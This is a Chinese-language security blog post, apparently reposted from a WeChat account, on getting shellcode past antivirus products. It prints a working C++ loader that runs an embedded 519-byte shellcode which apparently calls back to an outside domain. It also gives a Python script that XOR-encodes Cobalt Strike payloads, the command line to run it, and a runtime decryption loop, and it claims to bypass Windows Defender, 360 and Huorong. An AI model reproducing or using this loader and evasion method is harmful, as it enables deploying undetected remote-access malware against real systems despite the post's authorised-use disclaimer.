> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/dHnTK-BwBPVtJdK2kfcopQ)

✎ 阅读须知

  

  

乌鸦安全的技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。

乌鸦安全拥有对此文章的修改、删除和解释权限，如转载或传播此文章，需保证文章的完整性，未经允许，禁止转载！

本文所提供的工具仅用于学习，禁止用于其他，请在24小时内删除工具文件！！！

  

**本文作者：zedxx10**

 ![](http://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1A9eSovMjmg3vTs8uzRyicthuDpqskG1VEM5oAZ0VEFs822aickkgVrKyN4domWdEoxg7Z2OlkoWRVg/0?wx_fmt=png) ** 乌鸦安全 ** 专注于网络安全技术分享，红蓝对抗技术、免杀、反制、内网漫游、安全研究。 87篇原创内容   公众号

  

1. 前置知识
=======

忙了两三个月，（最近又要忙7月的活动dddd）也没空研究什么新东西 ，发一个之前测试的免杀思路 ，昨日测试依旧是过了国内的主流杀软。本篇文章需要有一定的`c++`、`c`语言基础，对不懂`c`语言的师傅不太友好 ，本次不会把源码完全展现出来，只讲思路。

目前市面上的绝大多数杀软基于判断一个`exe`是否为木马，无非就是敏感函数或是调用敏感的`api`、特征库匹配、`hash`值、监控内存之类的 ，所以静态的还是比较好过的，稍微处理一下自己的`shellcode`基本上是都可以过的，但是动态行为检测对于比较强的杀软是过不了的，本章的思路不适用`edr`或是`定制杀软`。

异或加密说实话已经烂大街的，基本上你用任何杀毒都查杀 ，当然这里是指单纯的异或加密`shellcode`。

2. 思路讲解
=======

下面是一个非常原始的`c++`免杀 ，很明显 `VirtualAlloc` 、`CreateThread`、 `WaitForSingleObject` 这3个函数是敏感函数，那么我们这里可以使用这3个函数原本的函数声明，通过声明来动态调用。

```
#include <Windows.h>  
// 入口函数  
int wmain(int argc,TCHAR * argv[]){  
  
    int shellcode_size = 519; // shellcode长度 这里需要更具你自己的shellcode长度进行修改  
    DWORD dwThreadId; // 线程ID  
    HANDLE hThread; // 线程句柄  
  
/* length: 519 bytes */  
char buf[] = "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x31\xc0\x6a\x40\xb4\x10\x68\x00\x10\x00\x00\x68\xff\xff\x07\x00\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x83\xc0\x40\x89\xc7\x50\x31\xc0\xb0\x70\xb4\x69\x50\x68\x64\x6e\x73\x61\x54\x68\x4c\x77\x26\x07\xff\xd5\xbb\x61\x00\x00\x00\xeb\x7b\x58\x89\xc6\x83\xef\x40\xfc\xb9\x40\x00\x00\x00\xf3\xa4\x89\xf8\x83\xe8\x40\x40\x80\xfb\x7a\x7e\x32\xbb\x61\x00\x00\x00\x88\x18\x40\x8b\x18\x43\x88\x18\x80\xfb\x7a\x7e\x1a\xbb\x61\x00\x00\x00\x88\x18\x40\x8b\x18\x43\x88\x18\x80\xfb\x7a\x7e\x07\xbb\x61\x00\x00\x00\x88\x18\x48\x48\xbb\x61\x00\x00\x00\x88\x18\x89\xf3\x89\xc6\x54\x5b\x83\xeb\x04\x53\x6a\x00\x53\x6a\x00\x68\x48\x02\x00\x00\x6a\x10\x50\x68\x6a\xc9\x9c\xc9\xff\xd5\x85\xc0\x75\x51\x89\xf0\x48\xb3\x00\x88\x18\x40\x8b\x30\xeb\x70\xe8\x80\xff\xff\xff\x00\x61\x61\x61\x2e\x6c\x6f\x76\x65\x32\x2e\x65\x73\x73\x68\x6f\x70\x77\x65\x62\x2e\x78\x79\x7a\x2e\x6c\x6f\x76\x65\x2e\x65\x73\x73\x68\x6f\x70\x77\x65\x62\x2e\x78\x79\x7a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x89\xf0\x48\x8b\x08\x41\x88\x08\x80\xf9\x5f\x7e\x07\x68\xf0\xb5\xa2\x56\xff\xd5\x68\xe8\x13\x00\x00\x68\x44\xf0\x35\xe0\xff\xd5\x89\xf0\x8b\x08\x89\xcb\xe9\x23\xff\xff\xff\x87\xfa\x5f\x8b\x47\x18\x83\xf8\x01\x75\x39\x83\xc7\x1c\x8b\x3f\x87\xde\x89\xfe\x8b\x7c\x24\x08\x31\xc9\xb1\xff\xf3\xa4\x57\x57\x57\x43\x87\xfa\x52\x57\x53\x81\xea\xff\x00\x00\x00\x52\x68\xf4\x00\x8e\xcc\xff\xd5\x5b\x5f\x5a\x3d\xff\x00\x00\x00\x7c\x07\xe9\xdf\xfe\xff\xff\x89\xd7\x81\xc7\x15\x00\x00\x00\xff\xe7\x00\x00\x00\x00";  
// 获取shellcode大小  
shellcode_size = sizeof(buf);  
/*  
VirtualAlloc(  
    NULL, // 基址  
    800,  // 大小  
    MEM_COMMIT, // 内存页状态  
    PAGE_EXECUTE_READWRITE // 可读可写可执行  
    );  
*/  
char * shellcode = (char *)VirtualAlloc(  
    NULL,  
    shellcode_size,  
    MEM_COMMIT,  
    PAGE_EXECUTE_READWRITE  
    );  
    // 将shellcode复制到可执行的内存页中  
CopyMemory(shellcode,buf,shellcode_size);  
  
hThread = CreateThread(  
    NULL, // 安全描述符  
    NULL, // 栈的大小  
    (LPTHREAD_START_ROUTINE)shellcode, // 函数  
    NULL, // 参数  
    NULL, // 线程标志  
    &dwThreadId // 线程ID  
    );  
  
WaitForSingleObject(hThread,INFINITE); // 一直等待线程执行结束  
    return 0;  
}
```

3. 源码修改思路
=========

### 3.1 处理敏感函数

`typedef`这里做了一个函数指针，其次我将`VirtualAlloc`声明成 `VirtualAllocT` ，`VirtualAllocT`作为一个新的类再进行动态调用`kernel32.dll`，其它的几个函数也是同理。

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1CLLsT1GJKJz6icXsgRpwgTLjY7P8xtQCW1eUV4lrurepibaVnTQV4QE4ssDc3WBMZGKS1h1aiafeIbQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "null")

在这里使用`python`脚本来处理：

```
import sys  
from argparse import ArgumentParser,FileType  
  
def process_bin(num,src_fp,dst_fp,dst_raw):  
shellcode = ''  
    shellcode_size = 0  
    shellcode_raw=b''  
    try:  
while True:  
code = src_fp.read(1)  
    if not code:  
break  
      
    base10 = ord(code) ^ num  
    base10_str = chr(base10)  
    shellcode_raw += base10_str.encode()  
    code_hex = hex(base10)  
    code_hex = code_hex.replace('0x','')  
    if(len(code_hex) == 1):  
code_hex = '0'+code_hex  
shellcode += '\\x' + code_hex  
shellcode_size += 1  
    src_fp.close()  
    dst_raw.write(shellcode_raw)  
    dst_raw.close()  
    dst_fp.write(shellcode)  
    dst_fp.close()  
    return shellcode_size  
    except Exception as e:  
sys.stderr.writelines(str(e))  
    def main():  
parser = ArgumentParser(prog='Shellcode X', description='[XOR The Cobaltstrike PAYLOAD.BINs] \t > Author: zedxx10@gmail.com')  
    parser.add_argument('-v','--version',nargs='?')  
    parser.add_argument('-s','--src',help=u'source bin file',type=FileType('rb'), required=True)  
    parser.add_argument('-d','--dst',help=u'destination shellcode file',type=FileType('w+'),required=True)  
    parser.add_argument('-n','--num',help=u'Confused number',type=int,default=90)  
    parser.add_argument('-r','--raw',help=u'output bin file', type=FileType('wb'),required=True)  
    args = parser.parse_args()  
    shellcode_size = process_bin(args.num,args.src,args.dst,args.raw)  
    sys.stdout.writelines("[+]Shellcode Size : {} \n".format(shellcode_size))  
      
    if __name__ == "__main__":  
    main()
```

`python`脚本的用法：将你`payload.bin`和`py`脚本放在一个目录下 ，使用`cmd`命令：

```
python  你的py脚本名 -s payload.bin -d payload.c -n 10 -r out.bin
```

执行完目录会生成一个`payload.c`文件 ，这里面就是已经加密好的`shellcode`，直接`copy`用就行了 ，执行完成会给你一个`shellcode`的长度。

在你的源码基础上`char buf[]=""`；将你加密之后的`shellcode`放入`buf` 并在该函数下面加上解密函数：

```
for (int i = 0; i < shellcode_size; i++) {  
        Sleep(50);  
        _InterlockedXor8(buf + i, 10);  
    }
```

到此整个代码就算完成了 ，注意这里我的`vs`编译是 `x64 release`的

### 3.2 效果展示

未加壳的情况下`Windows defender`是动静都过了，并且成功上线，其它的杀软没测。

加壳之后，国内的`360`、`火绒`动静也是全过，`Windows defender`动态静态成功上线，静态是可以过卡巴的但是动态过卡巴肯定是不可能的。

### 效果图

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")

  

往期推荐

[

CMD命令混淆学习



](https://mp.weixin.qq.com/s?__biz=MzI3NjA4MjMyMw==&mid=2647784573&idx=1&sn=e004a74f31cec85b57629069475de248&chksm=f35fa781c4282e97ccc70419d042680329cadc98d781df3e6fadc4205a8c324645abee35340f&scene=21#wechat_redirect)

[

新版掩日——免杀Windows Defender



](https://mp.weixin.qq.com/s?__biz=MzI3NjA4MjMyMw==&mid=2647784141&idx=1&sn=189d09e9daf8ff6fe2c51a163bcdd9ac&chksm=f35fa131c4282827b7d47e64f6a291f228a4c75f00b3c4d5b76833679e18ef33f08a331c57e5&scene=21#wechat_redirect)

[【免杀】C++静态免杀学习](https://mp.weixin.qq.com/s?__biz=MzI3NjA4MjMyMw==&mid=2647784058&idx=1&sn=ff1c60c76247fc875b62048b924f0aab&chksm=f35fa186c4282890c6387dd446f32789e0a9a60b478917975acc392d7192cd71ada8bd5c1d5b&scene=21#wechat_redirect)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

扫取二维码获取

更多精彩

乌鸦安全

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)